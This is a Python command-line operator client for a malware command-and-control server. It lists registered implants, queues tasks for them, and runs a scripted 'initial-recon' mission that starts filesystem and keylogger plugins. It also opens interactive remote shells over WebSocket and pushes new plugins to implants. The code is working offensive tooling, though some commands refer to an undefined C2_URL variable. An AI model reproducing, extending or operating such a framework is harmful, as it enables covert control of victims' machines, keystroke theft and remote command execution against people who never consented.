import click
import requests
import json
import time
import threading
import asyncio
import websockets

# --- Configuration ---
C2_URL_HTTP = "http://127.0.0.1:8000/api"
C2_URL_WS = "ws://127.0.0.1:8000/api"

# --- Helper Functions ---
def handle_request_error(e):
    """A centralized error handler for request exceptions."""
    if isinstance(e, requests.exceptions.ConnectionError):
        click.echo(click.style(f"Error: Connection refused. Is the C2 server running at {C2_URL}?", fg="red"), err=True)
    elif isinstance(e, requests.exceptions.HTTPError):
        click.echo(click.style(f"Error: HTTP {e.response.status_code} - {e.response.text}", fg="red"), err=True)
    else:
        click.echo(click.style(f"An unexpected error occurred: {e}", fg="red"), err=True)

# --- CLI Command Group ---
@click.group(context_settings=dict(help_option_names=['-h', '--help']))
def cli():
    """
    Crawler C2 Operator CLI

    This tool allows operators to interact with the C2 server to manage implants,
    assign tasks, and monitor operations, all while respecting the built-in
    Rules of Engagement (ROE).
    """
    pass

# --- Core Commands ---
@cli.command("implants")
def list_implants():
    """List all registered implants and their status."""
    try:
        response = requests.get(f"{C2_URL_HTTP}/admin/implants")
        response.raise_for_status()
        implants = response.json()
        if not implants:
            click.echo("No implants currently registered.")
            return

        click.echo(click.style("Registered Implants:", bold=True))
        for implant_id, data in implants.items():
            tier_color = "green" if data['roe_tier'] == 3 else "yellow" if data['roe_tier'] == 2 else "red"
            click.echo(
                f"  - ID: {click.style(implant_id, fg='cyan')}\n"
                f"    Host: {data['hostname']}\n"
                f"    OS: {data['os']}\n"
                f"    ROE Tier: {click.style(str(data['roe_tier']), fg=tier_color, bold=True)}\n"
                f"    Pending Tasks: {len(data['tasks'])}"
            )
    except requests.exceptions.RequestException as e:
        handle_request_error(e)

@cli.command("set-tier")
@click.argument("implant_id")
@click.argument("tier", type=click.Choice(['1', '2', '3']))
def set_tier(implant_id, tier):
    """Set the ROE tier for an implant (1=Hostile, 2=Suspect, 3=Protected)."""
    try:
        response = requests.put(f"{C2_URL}/admin/tier/{implant_id}/{tier}")
        response.raise_for_status()
        click.echo(click.style(f"Success: {response.json()}", fg="green"))
    except requests.exceptions.RequestException as e:
        handle_request_error(e)

@cli.command("task")
@click.argument("implant_id")
@click.argument("command")
@click.option("--args", default="{}", help='JSON string of arguments, e.g., \'{"plugin_name": "keylogger"}\'')
def add_task(implant_id, command, args):
    """Assign a single task to an implant."""
    try:
        task_data = { "command": command, "args": json.loads(args) }
        response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=task_data)
        response.raise_for_status()
        click.echo(click.style(f"Success: Task '{command}' queued for {implant_id}.", fg="green"))
    except json.JSONDecodeError:
        click.echo(click.style("Error: Invalid JSON string for --args.", fg="red"), err=True)
    except requests.exceptions.RequestException as e:
        handle_request_error(e)

# --- Assist/Automation Feature ---
@cli.command("mission")
@click.argument("implant_id")
@click.argument("mission_name", type=click.Choice(['initial-recon']))
def run_mission(implant_id, mission_name):
    """
    (ASSIST FEATURE) Run a predefined automated mission.

    'initial-recon': Gathers basic system and network info.
    """
    click.echo(f"Starting mission '{mission_name}' for implant {implant_id}...")

    missions = {
        "initial-recon": [
            {"command": "start_plugin", "args": {"plugin_name": "filesystem"}, "delay": 0},
            {"command": "start_plugin", "args": {"plugin_name": "keylogger"}, "delay": 1},
        ]
    }

    task_sequence = missions.get(mission_name, [])

    for task_info in task_sequence:
        try:
            task_data = { "command": task_info['command'], "args": task_info['args'] }
            response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=task_data)
            response.raise_for_status()
            click.echo(f"  - Queued task: {task_info['command']} with args {task_info['args']}")
            time.sleep(task_info['delay'])
        except requests.exceptions.RequestException as e:
            click.echo(click.style(f"  - Failed to queue task: {task_info['command']}", fg="red"), err=True)
            handle_request_error(e)
            click.echo("Aborting mission.")
            return

    click.echo(click.style(f"\nMission '{mission_name}' successfully queued.", fg="green", bold=True))

# --- Interactive Shell Command ---
def receive_handler(ws):
    """A simple receiver loop that runs in a thread."""
    while True:
        try:
            message = ws.recv()
            # Print the received output, ensuring it doesn't end with a newline
            # that would mess up the prompt.
            print(message, end='', flush=True)
        except websockets.exceptions.ConnectionClosed:
            print("\n[!] Connection to C2 closed.")
            break

@cli.command("shell")
@click.argument("implant_id")
def interactive_shell(implant_id):
    """Start an interactive shell session with an implant."""
    # 1. Task the implant to start the shell plugin via HTTP
    click.echo(f"[*] Requesting shell on implant {implant_id}...")
    ws_uri_for_implant = f"{C2_URL_WS}/ws/implant/{implant_id}"
    task_payload = {
        "command": "start_plugin",
        "args": {"plugin_name": "shell", "uri": ws_uri_for_implant}
    }
    try:
        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        handle_request_error(e)
        return

    # 2. Connect to the CLI-facing WebSocket endpoint
    ws_uri_for_cli = f"{C2_URL_WS}/ws/cli/{implant_id}"
    click.echo(f"[*] Connecting to shell session at {ws_uri_for_cli}...")

    try:
        with websockets.sync.client.connect(ws_uri_for_cli) as websocket:
            click.echo(click.style("[+] Connected! Type 'exit' to quit.", fg="green"))

            # Start a receiver thread to print output from the shell
            receiver_thread = threading.Thread(target=receive_handler, args=(websocket,))
            receiver_thread.daemon = True
            receiver_thread.start()

            # Main loop to send commands from the operator
            while True:
                command = input()
                if command.lower() == 'exit':
                    break

                # Append newline so the shell executes the command
                full_command = command + "\n"
                websocket.send(full_command)

        click.echo(click.style("[+] Shell session terminated.", fg="yellow"))

    except Exception as e:
        click.echo(f"[!] Error during shell session: {e}", err=True)


@cli.command("update")
@click.argument("implant_id")
@click.argument("plugin_name")
def update_plugin(implant_id, plugin_name):
    """Tasks an implant to download a new plugin from the C2."""
    click.echo(f"[*] Tasking implant {implant_id} to download plugin '{plugin_name}'...")
    task_payload = {
        "command": "start_plugin",
        "args": {"plugin_name": "update", "plugin_to_download": plugin_name}
    }
    try:
        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
        response.raise_for_status()
        click.echo(click.style(f"[+] Update task sent successfully.", fg="green"))
    except requests.exceptions.RequestException as e:
        handle_request_error(e)

@cli.command("reload")
@click.argument("implant_id")
def reload_plugins(implant_id):
    """Tasks an implant to reload its plugins from disk."""
    click.echo(f"[*] Sending 'reload_plugins' command to implant {implant_id}...")
    task_payload = { "command": "reload_plugins", "args": {} }
    try:
        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
        response.raise_for_status()
        click.echo(click.style(f"[+] Reload command sent successfully.", fg="green"))
    except requests.exceptions.RequestException as e:
        handle_request_error(e)


if __name__ == "__main__":
    cli()
